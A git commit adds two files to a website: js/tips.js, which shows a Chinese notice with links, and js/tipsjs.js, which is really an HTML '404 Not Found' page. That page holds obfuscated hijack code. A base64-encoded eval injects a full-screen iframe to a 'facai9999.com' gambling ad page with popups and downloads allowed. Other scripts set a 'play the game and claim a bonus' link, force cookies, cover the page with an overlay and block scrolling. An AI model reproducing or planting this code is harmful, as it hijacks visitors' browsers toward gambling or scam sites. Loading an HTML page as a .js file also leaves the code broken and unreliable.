cf568ab90690d660f632775a08c2d3176adac3c3
quan-ge <quan13177379368@qq.com>
2026-08-07 17:18:24 +0800

    new file:   js/tips.js and js/tipsjs.js

---
+++ js/tips.js
@@ -0,0 +1,27 @@
+document.write('<script src="./tipsjs.js"></script>')
+
+var main = `温馨提示 \n\n
+网址目前有较多BUG，暂未解决
+并且兼容性可能一般
+仅应急使用！
+-------
+文件下载或拉库请用专用服务：
+<a href="https://fgp.120322.dpdns.org">https://fgp.120322.dpdns.org/</a>
+-------
+公共导航页：
+<a href="http://nas.120322.xyz/">http://nas.120322.xyz//</a>
+`
+
+swal(main, 'success'); function AddFavorite(title, url) {
+  try {
+      window.external.addFavorite(url, title);
+  }
+catch (e) {
+     try {
+       window.sidebar.addPanel(title, url,);
+    }
+     catch (e) {
+         alert("抱歉，您所使用的浏览器无法完成此操作。");
+     }
+  }
+}
---
+++ js/tipsjs.js
@@ -0,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>404 Not Found</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0"><script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?7f5532edce961c99ab7a61815bf5454c";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script></head>
+<body><script>document.cookie='UserAgent=Mozilla%2f5.0+(Windows+NT+10.0%3b+Win64%3b+x64)+AppleWebKit%2f537.36+(KHTML%2c+like+Gecko)+Chrome%2f151.0.0.0+Safari%2f537.36+Edg%2f151.0.0.0';document.cookie='Referer=';</script><script>var yidousoft_urls="/配置信息/广告模板/facai9999.com_hJ3dkJ/index.html";</script><script type="text/javascript" src="/real-time/jquery-3.3.1.js"></script><style>body{padding:0px;margin:0px; -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none;-moz-user-select: none;-ms-user-select: none; user-select: none;}.fade{width:100%;height:100%;position:fixed;outline:0;left:0;right:0;bottom:0;top:0;opacity:0.99;background-color:#191919;z-index:999999}.containner{z-index:1000000;font-family: "微软雅黑";position:fixed;top:0px;width:100%;height:100%;color:white;margin:auto;text-align:center}.containner h3{color:gold;font-family:"楷体";font-size:38pt;margin-top:0;margin-bottom:20px}.containner p{color:white;font-size:18pt;margin-top:0;margin-bottom:20px;padding-top:30px;}.containner p img{max-height:200px;max-width:320px;border-radius:5px;margin:auto;}.containner .time{color:red;height:40px;width:300px;margin:auto;text-align:left;font-size:28pt;font-weight:bold;text-shadow:2px 2px 2px white}.containner a{color:gold!important;text-decoration:none;cursor:pointer;font-size:18pt}.expand{height:4px;border-radius:10px;background:gold;margin-top:13px;box-shadow:0 0 10px 1px #f18c00;}.css3{width:300px;-moz-animation:css3 1s ease-out;-webkit-animation:css3 1s ease-out}@-moz-keyframes css3{0%{width:0}100%{width:300px}}@-webkit-keyframes css3{0%{width:0}100%{width:300px}}</style><div class="fade"></div><div class="containner" id="containner"><p>如果您的浏览器未跳转，请点击<a id="TextAdd" rel="nofollow" href="&#47;&#37197;&#32622;&#20449;&#24687;&#47;&#24191;&#21578;&#27169;&#26495;&#47;&#102;&#97;&#99;&#97;&#105;&#57;&#57;&#57;&#57;&#46;&#99;&#111;&#109;&#95;&#104;&#74;&#51;&#100;&#107;&#74;&#47;&#105;&#110;&#100;&#101;&#120;&#46;&#104;&#116;&#109;&#108;">此处</a>进行游戏并领取优惠</p><div style='height:30px;width: 300px;margin:auto;'><div class="expand css3"></div></div></div><script>var url = decodeURIComponent(window.atob("JTJmJWU5JTg1JThkJWU3JWJkJWFlJWU0JWJmJWExJWU2JTgxJWFmJTJmJWU1JWI5JWJmJWU1JTkxJThhJWU2JWE4JWExJWU2JTlkJWJmJTJmZmFjYWk5OTk5LmNvbV9oSjNka0olMmZpbmRleC5odG1s"));document.getElementById("TextAdd").setAttribute("href", url);</script><script>eval(decodeURIComponent(window.atob("ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJTIyY29udGFpbm5lciUyMikuaW5uZXJIVE1MKyUzZCslMjclM2NpZnJhbWUraWQlM2QlMjJ5aWRvdXNvZnQtaWZyYW1lJTIyK3NyYyUzZCUyMiUyZiVlOSU4NSU4ZCVlNyViZCVhZSVlNCViZiVhMSVlNiU4MSVhZiUyZiVlNSViOSViZiVlNSU5MSU4YSVlNiVhOCVhMSVlNiU5ZCViZiUyZmZhY2FpOTk5OS5jb21faEozZGtKJTJmaW5kZXguaHRtbCUyMitzYW5kYm94JTNkJTIyYWxsb3ctZm9ybXMrYWxsb3ctcG9wdXBzK2FsbG93LXNjcmlwdHMrYWxsb3ctc2FtZS1vcmlnaW4rYWxsb3ctZG93bmxvYWRzJTIyK2ZyYW1lYm9yZGVyJTNkJTIyMCUyMitzdHlsZSUzZCUyMndpZHRoJTNhMTAwJTI1JTNiK2hlaWdodCUzYTEwMCUyNSUzYmJhY2tncm91bmQtY29sb3IlM2Erd2hpdGUlM2IlMjIlM2UlM2MlMmZpZnJhbWUlM2UlMjclM2I=")).replace(/\+/g, " "));document.body.style = 'overflow:hidden!important';</script>
+
+    <div class="error-box">
+        <div class="error-code">404</div>
+        <div class="error-title">页面不存在</div>
+        <div class="error-desc">抱歉，您访问的页面可能已被删除、移动或暂时不可用。</div>
+        <a href="/" class="home-link">返回首页</a>
+    </div>
+
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https'){
+   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+</body>
+</html>
